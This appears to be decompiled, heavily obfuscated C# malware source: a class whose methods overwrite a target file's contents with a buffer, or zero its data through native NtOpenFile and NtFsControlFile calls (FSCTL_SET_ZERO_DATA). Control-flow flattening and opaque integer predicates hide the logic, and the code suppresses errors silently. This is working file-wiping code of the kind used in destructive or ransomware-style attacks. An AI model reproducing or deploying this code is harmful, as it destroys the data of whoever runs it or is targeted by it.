using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;

namespace ns0;

public static class GClass9
{
	public static void smethod_0(GClass3 gclass3_0)
	{
		bool flag = false;
		int i = 0;
		object[] array = new object[7]
		{
			new int[6] { 90, -1506708528, 90, 1506708663, 10, 180 },
			new int[12]
			{
				90, 384046519, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
				10, 180
			},
			new int[6] { 90, -1506708658, 90, 1506708663, 10, 180 },
			new int[9] { 90, -1695743521, 90, 189035017, 10, 90, 1506708663, 10, 180 },
			new int[9] { 90, -1695743637, 90, 189035017, 10, 90, 1506708663, 10, 180 },
			new int[6] { 90, -1506708450, 90, 1506708663, 10, 180 },
			new int[9] { 90, -1695743669, 90, 189035017, 10, 90, 1506708663, 10, 180 }
		};
		for (; i < 7; i++)
		{
			switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array[i], 0, 0))
			{
			case 213:
			{
				if (flag)
				{
					break;
				}
				int k = 0;
				object[] array3 = new object[5]
				{
					new int[9] { 90, -1695743580, 90, 189035017, 10, 90, 1506708663, 10, 180 },
					new int[12]
					{
						90, 384046484, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
						10, 180
					},
					new int[9] { 90, -1695743551, 90, 189035017, 10, 90, 1506708663, 10, 180 },
					new int[12]
					{
						90, 384046617, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
						10, 180
					},
					new int[6] { 90, -1506708464, 90, 1506708663, 10, 180 }
				};
				for (; k < 5; k++)
				{
					switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array3[k], 0, 0))
					{
					case 185:
						try
						{
							int l = 0;
							object[] array4 = new object[5]
							{
								new int[12]
								{
									90, 384046568, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
									10, 180
								},
								new int[6] { 90, -1506708473, 90, 1506708663, 10, 180 },
								new int[12]
								{
									90, 384046583, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
									10, 180
								},
								new int[12]
								{
									90, 384046537, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
									10, 180
								},
								new int[6] { 90, -1506708620, 90, 1506708663, 10, 180 }
							};
							for (; l < 5; l++)
							{
								int num = aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array4[l], 0, 0);
								if (num != 42 && num == 105)
								{
									smethod_1(gclass3_0.String_0);
								}
							}
						}
						catch (Exception)
						{
						}
						break;
					}
				}
				break;
			}
			case 87:
				try
				{
					int j = 0;
					object[] array2 = new object[5]
					{
						new int[12]
						{
							90, 384046514, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
							10, 180
						},
						new int[12]
						{
							90, 384046582, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
							10, 180
						},
						new int[9] { 90, -1695743484, 90, 189035017, 10, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708606, 90, 1506708663, 10, 180 },
						new int[9] { 90, -1695743521, 90, 189035017, 10, 90, 1506708663, 10, 180 }
					};
					for (; j < 5; j++)
					{
						switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array2[j], 0, 0))
						{
						case 57:
							flag = smethod_2(gclass3_0.String_0);
							break;
						}
					}
				}
				catch (Exception)
				{
				}
				break;
			}
		}
	}

	public static bool smethod_1(string string_0)
	{
		int i = 0;
		object[] array = new object[5]
		{
			new int[6] { 90, -1506708543, 90, 1506708663, 10, 180 },
			new int[6] { 90, -1506708541, 90, 1506708663, 10, 180 },
			new int[6] { 90, -1506708569, 90, 1506708663, 10, 180 },
			new int[12]
			{
				90, 384046528, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
				10, 180
			},
			new int[12]
			{
				90, 384046470, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
				10, 180
			}
		};
		for (; i < 5; i++)
		{
			int num = aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array[i], 0, 0);
			if (num == 37 || num != 96)
			{
				continue;
			}
			using FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.ReadWrite);
			byte[] array2 = new byte[aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl(new int[29]
			{
				90, 1162427705, 190, 210, 220, 90, 1162427705, 190, 200, 220,
				240, 90, 1323731872, 190, 210, 220, 90, 1323731872, 190, 200,
				220, 240, 240, 90, 12, 190, 260, 230, 180
			}, 0, 0)];
			int j = 0;
			object[] array3 = new object[5]
			{
				new int[9] { 90, -1695743491, 90, 189035017, 10, 90, 1506708663, 10, 180 },
				new int[6] { 90, -1506708576, 90, 1506708663, 10, 180 },
				new int[6] { 90, -1506708657, 90, 1506708663, 10, 180 },
				new int[12]
				{
					90, 384046483, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
					10, 180
				},
				new int[12]
				{
					90, 384046620, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
					10, 180
				}
			};
			for (; j < 5; j++)
			{
				switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array3[j], 0, 0))
				{
				case 51:
					try
					{
						int k = 0;
						object[] array4 = new object[5]
						{
							new int[9] { 90, -1695743562, 90, 189035017, 10, 90, 1506708663, 10, 180 },
							new int[12]
							{
								90, 384046490, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
								10, 180
							},
							new int[9] { 90, -1695743572, 90, 189035017, 10, 90, 1506708663, 10, 180 },
							new int[9] { 90, -1695743618, 90, 189035017, 10, 90, 1506708663, 10, 180 },
							new int[9] { 90, -1695743670, 90, 189035017, 10, 90, 1506708663, 10, 180 }
						};
						for (; k < 5; k++)
						{
							int num2 = aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array4[k], 0, 0);
							if (num2 == 9 || num2 != 62)
							{
								continue;
							}
							while (fileStream.Position < fileStream.Length)
							{
								int l = 0;
								object[] array5 = new object[5]
								{
									new int[6] { 90, -1506708609, 90, 1506708663, 10, 180 },
									new int[9] { 90, -1695743547, 90, 189035017, 10, 90, 1506708663, 10, 180 },
									new int[9] { 90, -1695743506, 90, 189035017, 10, 90, 1506708663, 10, 180 },
									new int[12]
									{
										90, 384046479, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
										10, 180
									},
									new int[9] { 90, -1695743645, 90, 189035017, 10, 90, 1506708663, 10, 180 }
								};
								for (; l < 5; l++)
								{
									int num3 = aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array5[l], 0, 0);
									if (num3 == 34 || num3 != 47)
									{
										continue;
									}
									try
									{
										int m = 0;
										object[] array6 = new object[5]
										{
											new int[9] { 90, -1695743586, 90, 189035017, 10, 90, 1506708663, 10, 180 },
											new int[6] { 90, -1506708474, 90, 1506708663, 10, 180 },
											new int[6] { 90, -1506708480, 90, 1506708663, 10, 180 },
											new int[12]
											{
												90, 384046476, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
												10, 180
											},
											new int[9] { 90, -1695743617, 90, 189035017, 10, 90, 1506708663, 10, 180 }
										};
										for (; m < 5; m++)
										{
											switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array6[m], 0, 0))
											{
											case 44:
											{
												long num4 = fileStream.Length - fileStream.Position;
												int n = 0;
												object[] array7 = new object[5]
												{
													new int[12]
													{
														90, 384046627, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
														10, 180
													},
													new int[6] { 90, -1506708489, 90, 1506708663, 10, 180 },
													new int[12]
													{
														90, 384046600, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
														10, 180
													},
													new int[12]
													{
														90, 384046450, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
														10, 180
													},
													new int[12]
													{
														90, 384046520, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
														10, 180
													}
												};
												for (; n < 5; n++)
												{
													switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array7[n], 0, 0))
													{
													case 18:
													{
														if (array2.Length > num4)
														{
															int num5 = 0;
															object[] array8 = new object[5]
															{
																new int[6] { 90, -1506708488, 90, 1506708663, 10, 180 },
																new int[6] { 90, -1506708589, 90, 1506708663, 10, 180 },
																new int[12]
																{
																	90, 384046477, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
																	10, 180
																},
																new int[9] { 90, -1695743482, 90, 189035017, 10, 90, 1506708663, 10, 180 },
																new int[6] { 90, -1506708557, 90, 1506708663, 10, 180 }
															};
															for (; num5 < 5; num5++)
															{
																int num6 = aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array8[num5], 0, 0);
																if (num6 != 105 && num6 == 198)
																{
																	fileStream.Write(array2, aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl(new int[13]
																	{
																		90, 1162427705, 90, 1162427705, 190, 210, 220, 190, 210, 220,
																		270, 230, 180
																	}, 0, 0), (int)num4);
																}
															}
															break;
														}
														int num7 = 0;
														object[] array9 = new object[5]
														{
															new int[6] { 90, -1506708599, 90, 1506708663, 10, 180 },
															new int[9] { 90, -1695743665, 90, 189035017, 10, 90, 1506708663, 10, 180 },
															new int[9] { 90, -1695743538, 90, 189035017, 10, 90, 1506708663, 10, 180 },
															new int[12]
															{
																90, 384046441, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
																10, 180
															},
															new int[9] { 90, -1695743494, 90, 189035017, 10, 90, 1506708663, 10, 180 }
														};
														for (; num7 < 5; num7++)
														{
															switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array9[num7], 0, 0))
															{
															case 9:
																fileStream.Write(array2, aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl(new int[13]
																{
																	90, 1162427705, 90, 1162427705, 190, 210, 220, 190, 210, 220,
																	270, 230, 180
																}, 0, 0), array2.Length);
																break;
															}
														}
														break;
													}
													}
												}
												break;
											}
											}
										}
									}
									catch (Exception ex)
									{
										int num8 = 0;
										object[] array10 = new object[5]
										{
											new int[6] { 90, -1506708660, 90, 1506708663, 10, 180 },
											new int[12]
											{
												90, 384046551, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
												10, 180
											},
											new int[12]
											{
												90, 384046631, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
												10, 180
											},
											new int[12]
											{
												90, 384046443, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
												10, 180
											},
											new int[6] { 90, -1506708596, 90, 1506708663, 10, 180 }
										};
										for (; num8 < 5; num8++)
										{
											switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array10[num8], 0, 0))
											{
											case 11:
												if (ex.Message != "X2Sa9o")
												{
													throw ex;
												}
												break;
											}
										}
									}
								}
							}
						}
					}
					catch (Exception ex2)
					{
						int num9 = 0;
						object[] array11 = new object[5]
						{
							new int[9] { 90, -1695743620, 90, 189035017, 10, 90, 1506708663, 10, 180 },
							new int[6] { 90, -1506708530, 90, 1506708663, 10, 180 },
							new int[9] { 90, -1695743623, 90, 189035017, 10, 90, 1506708663, 10, 180 },
							new int[6] { 90, -1506708610, 90, 1506708663, 10, 180 },
							new int[9] { 90, -1695743593, 90, 189035017, 10, 90, 1506708663, 10, 180 }
						};
						for (; num9 < 5; num9++)
						{
							switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array11[num9], 0, 0))
							{
							case 53:
								if (ex2.Message != "xQ3vdnGp")
								{
									throw ex2;
								}
								break;
							}
						}
					}
					break;
				}
			}
		}
		return true;
	}

	public static bool smethod_2(string string_0)
	{
		SafeFileHandle safeFileHandle_ = null;
		GClass6.GStruct2 gstruct2_ = default(GClass6.GStruct2);
		GClass6.GStruct0 gstruct0_ = default(GClass6.GStruct0);
		string string_ = "\\??\\" + string_0;
		GClass6.GStruct1 gStruct = new GClass6.GStruct1(string_);
		IntPtr intPtr = Marshal.AllocHGlobal(Marshal.SizeOf((object)gStruct));
		int i = 0;
		object[] array = new object[27]
		{
			new int[12]
			{
				90, 1515937774, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515938204, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515938226, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155336801, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155336869, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840041, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515937375, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515938222, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515938216, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155337452, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840045, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515938024, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515937298, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155337645, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840424, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840868, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155337289, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515938257, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155337736, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155337021, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155337453, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515938266, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[9] { 90, -74840879, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155337599, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515937767, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155337208, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515938003, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			}
		};
		for (; i < 27; i++)
		{
			switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array[i], 0, 0))
			{
			case 30:
				gstruct2_.intptr_0 = IntPtr.Zero;
				break;
			case 517:
				gstruct2_.ulong_1 = 64uL;
				break;
			case 97:
				Marshal.StructureToPtr((object)gStruct, intPtr, fDeleteOld: false);
				break;
			case 756:
				gstruct2_.ulong_0 = (ulong)Marshal.SizeOf((object)gstruct2_);
				break;
			case 998:
				gstruct2_.intptr_3 = IntPtr.Zero;
				break;
			case 989:
				gstruct2_.intptr_2 = IntPtr.Zero;
				break;
			case 873:
				gstruct2_.intptr_1 = intPtr;
				break;
			}
		}
		uint num = GClass6.NtOpenFile(out safeFileHandle_, 3222274048uL, ref gstruct2_, ref gstruct0_, 7uL, 32uL);
		ulong ulong_ = 0uL;
		int j = 0;
		object[] array2 = new object[3]
		{
			new int[12]
			{
				90, 1515937311, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[9] { 90, -74840888, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515937279, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			}
		};
		for (; j < 3; j++)
		{
			if (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array2[j], 0, 0) == 11)
			{
				GClass6.GetFileSizeEx(safeFileHandle_, out ulong_);
			}
		}
		GClass6.GStruct3 gStruct2 = default(GClass6.GStruct3);
		int k = 0;
		object[] array3 = new object[3]
		{
			new int[12]
			{
				90, 1515937337, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[12]
			{
				90, 1515937279, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155336859, 90, 1155336772, 20, 180 }
		};
		for (; k < 3; k++)
		{
			if (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array3[k], 0, 0) == 87)
			{
				gStruct2.ulong_1 = ulong_;
			}
		}
		IntPtr intPtr2 = IntPtr.Zero;
		int l = 0;
		object[] array4 = new object[13]
		{
			new int[6] { 90, 1155337117, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840676, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840709, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840509, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515937653, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[6] { 90, 1155337219, 90, 1155336772, 20, 180 },
			new int[12]
			{
				90, 1515937343, 90, 1590778228, 20, 90, 1230177732, 10, 90, 1155336772,
				20, 180
			},
			new int[9] { 90, -74840807, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155336841, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155336885, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155337084, 90, 1155336772, 20, 180 },
			new int[9] { 90, -74840492, 90, 1230177732, 10, 90, 1155336772, 20, 180 },
			new int[6] { 90, 1155336978, 90, 1155336772, 20, 180 }
		};
		for (; l < 13; l++)
		{
			switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array4[l], 0, 0))
			{
			case 153:
				try
				{
					int n = 0;
					object[] array6 = new object[5]
					{
						new int[6] { 90, -1506708496, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708522, 90, 1506708663, 10, 180 },
						new int[9] { 90, -1695743533, 90, 189035017, 10, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708584, 90, 1506708663, 10, 180 },
						new int[9] { 90, -1695743555, 90, 189035017, 10, 90, 1506708663, 10, 180 }
					};
					for (; n < 5; n++)
					{
						switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array6[n], 0, 0))
						{
						case 79:
							num = GClass6.NtFsControlFile(safeFileHandle_, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref gstruct0_, 622792uL, intPtr2, (ulong)Marshal.SizeOf((object)gStruct2), IntPtr.Zero, (ulong)aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl(new int[13]
							{
								90, 1162427705, 90, 1162427705, 190, 210, 220, 190, 210, 220,
								270, 230, 180
							}, 0, 0));
							break;
						}
					}
				}
				catch (Exception)
				{
				}
				finally
				{
					GClass6.CloseHandle(safeFileHandle_.DangerousGetHandle());
				}
				break;
			case 75:
				try
				{
					int num2 = 0;
					object[] array7 = new object[5]
					{
						new int[6] { 90, -1506708529, 90, 1506708663, 10, 180 },
						new int[9] { 90, -1695743599, 90, 189035017, 10, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708526, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708608, 90, 1506708663, 10, 180 },
						new int[12]
						{
							90, 384046547, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
							10, 180
						}
					};
					for (; num2 < 5; num2++)
					{
						switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array7[num2], 0, 0))
						{
						case 55:
							Marshal.StructureToPtr((object)gStruct2, intPtr2, fDeleteOld: false);
							break;
						}
					}
				}
				catch (Exception)
				{
				}
				break;
			case 468:
				if (num != 0)
				{
					return false;
				}
				break;
			case 385:
				try
				{
					int m = 0;
					object[] array5 = new object[5]
					{
						new int[9] { 90, -1695743490, 90, 189035017, 10, 90, 1506708663, 10, 180 },
						new int[6] { 90, -1506708523, 90, 1506708663, 10, 180 },
						new int[12]
						{
							90, 384046582, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
							10, 180
						},
						new int[12]
						{
							90, 384046467, 90, 2079790112, 20, 90, 189035017, 10, 90, 1506708663,
							10, 180
						},
						new int[6] { 90, -1506708507, 90, 1506708663, 10, 180 }
					};
					for (; m < 5; m++)
					{
						switch (aG1ItHZ3wd0hGc.JwbyZ0j7ANqJRl((int[])array5[m], 0, 0))
						{
						case 35:
							intPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf((object)gStruct2));
							break;
						}
					}
				}
				catch (Exception)
				{
				}
				break;
			}
		}
		return true;
	}
}
